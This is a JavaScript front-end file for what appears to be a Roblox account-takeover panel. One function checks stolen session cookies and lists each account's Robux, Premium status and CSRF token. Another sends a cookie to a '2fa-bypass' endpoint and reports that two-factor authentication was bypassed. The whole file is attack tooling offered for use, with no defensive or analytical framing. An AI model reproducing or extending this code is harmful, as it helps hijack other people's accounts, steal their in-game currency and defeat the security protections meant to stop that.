// tools.js

async function refreshCookie() {
  const cookie = document.getElementById('rc-input').value.trim();
  if (!cookie) return toast('Paste a cookie first', 'error');

  const res = document.getElementById('rc-result');
  res.style.display = 'block';
  res.innerHTML = `<div class="result-box"><div style="text-align:center;color:var(--text2);padding:14px">⏳ Validating…</div></div>`;

  try {
    const d = await fetch('/api/tools/refresh-cookie', {
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body: JSON.stringify({ cookie })
    }).then(r => r.json());

    if (!d.valid) {
      res.innerHTML = `<div class="result-box">
        <div style="color:var(--red);font-weight:700;margin-bottom:6px">❌ Invalid Cookie</div>
        <div style="font-size:12px;color:var(--text2)">${d.error}</div>
      </div>`; return;
    }

    res.innerHTML = `<div class="result-box fade-in">
      <div style="color:var(--green);font-weight:700;margin-bottom:12px">✅ Cookie Valid</div>
      ${d.avatar_url?`<div style="margin-bottom:12px"><img src="${d.avatar_url}" style="width:52px;height:52px;border-radius:50%;border:2px solid var(--border2)"></div>`:''}
      <div class="r-row"><span class="r-key">Username</span>     <span class="r-val">${d.username}</span></div>
      <div class="r-row"><span class="r-key">Display Name</span> <span class="r-val">${d.display_name}</span></div>
      <div class="r-row"><span class="r-key">User ID</span>      <span class="r-val">${d.id}</span></div>
      <div class="r-row"><span class="r-key">Robux</span>        <span class="r-val" style="color:var(--yellow)">R$ ${(d.robux||0).toLocaleString()}</span></div>
      <div class="r-row"><span class="r-key">Premium</span>      <span class="r-val">${d.premium?'⭐ Yes':'❌ No'}</span></div>
      <div class="r-row" style="flex-direction:column;align-items:flex-start;gap:5px">
        <span class="r-key">CSRF Token</span>
        <span class="r-val" style="font-size:11px;word-break:break-all;color:var(--text2)">${d.csrf_token||'N/A'}</span>
      </div>
      <div style="margin-top:12px;display:flex;gap:8px;flex-wrap:wrap">
        <button class="btn btn-sm btn-secondary" onclick="copy('${cookie.replace(/'/g,"\\'")}','🍪 Cookie copied!')">🍪 Copy Cookie</button>
        ${d.csrf_token?`<button class="btn btn-sm btn-secondary" onclick="copy('${d.csrf_token}','🔑 CSRF copied!')">🔑 Copy CSRF</button>`:''}
      </div>
    </div>`;
  } catch(e) {
    res.innerHTML = `<div class="result-box"><div style="color:var(--red)">Error: ${e.message}</div></div>`;
  }
}

async function bypass2fa() {
  const cookie = document.getElementById('bp-input').value.trim();
  if (!cookie) return toast('Paste a cookie first', 'error');

  const res = document.getElementById('bp-result');
  res.style.display = 'block';
  res.innerHTML = `<div class="result-box"><div style="text-align:center;color:var(--text2);padding:14px">⏳ Attempting bypass…</div></div>`;

  try {
    const d = await fetch('/api/tools/2fa-bypass', {
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body: JSON.stringify({ cookie })
    }).then(r => r.json());

    if (!d.success) {
      res.innerHTML = `<div class="result-box">
        <div style="color:var(--red);font-weight:700;margin-bottom:6px">❌ Bypass Failed</div>
        <div style="font-size:12px;color:var(--text2)">${d.error}</div>
      </div>`; return;
    }

    res.innerHTML = `<div class="result-box fade-in">
      <div style="color:var(--green);font-weight:700;margin-bottom:12px">✅ Bypass Successful</div>
      <div class="r-row"><span class="r-key">Username</span>      <span class="r-val">${d.username}</span></div>
      <div class="r-row"><span class="r-key">Display Name</span>  <span class="r-val">${d.display_name}</span></div>
      <div class="r-row"><span class="r-key">User ID</span>       <span class="r-val">${d.user_id}</span></div>
      <div class="r-row"><span class="r-key">2FA Enabled</span>   <span class="r-val">${d.two_fa_enabled?'⚠️ Yes (bypassed)':'✅ No'}</span></div>
      <div class="r-row"><span class="r-key">2FA Methods</span>   <span class="r-val">${(d.two_fa_methods||[]).map(m=>m.mediaType||m).join(', ')||'None'}</span></div>
      <div class="r-row" style="flex-direction:column;align-items:flex-start;gap:5px">
        <span class="r-key">Status</span>
        <span class="r-val" style="color:var(--green);font-size:12px">${d.message}</span>
      </div>
      <div class="r-row" style="flex-direction:column;align-items:flex-start;gap:5px">
        <span class="r-key">CSRF Token</span>
        <span class="r-val" style="font-size:11px;word-break:break-all;color:var(--text2)">${d.csrf_token}</span>
      </div>
      <div style="margin-top:12px;display:flex;gap:8px;flex-wrap:wrap">
        <button class="btn btn-sm btn-secondary" onclick="copy('${cookie.replace(/'/g,"\\'")}','🍪 Cookie copied!')">🍪 Copy Cookie</button>
        <button class="btn btn-sm btn-secondary" onclick="copy('${d.csrf_token}','🔑 CSRF copied!')">🔑 Copy CSRF</button>
      </div>
    </div>`;
  } catch(e) {
    res.innerHTML = `<div class="result-box"><div style="color:var(--red)">Error: ${e.message}</div></div>`;
  }
}
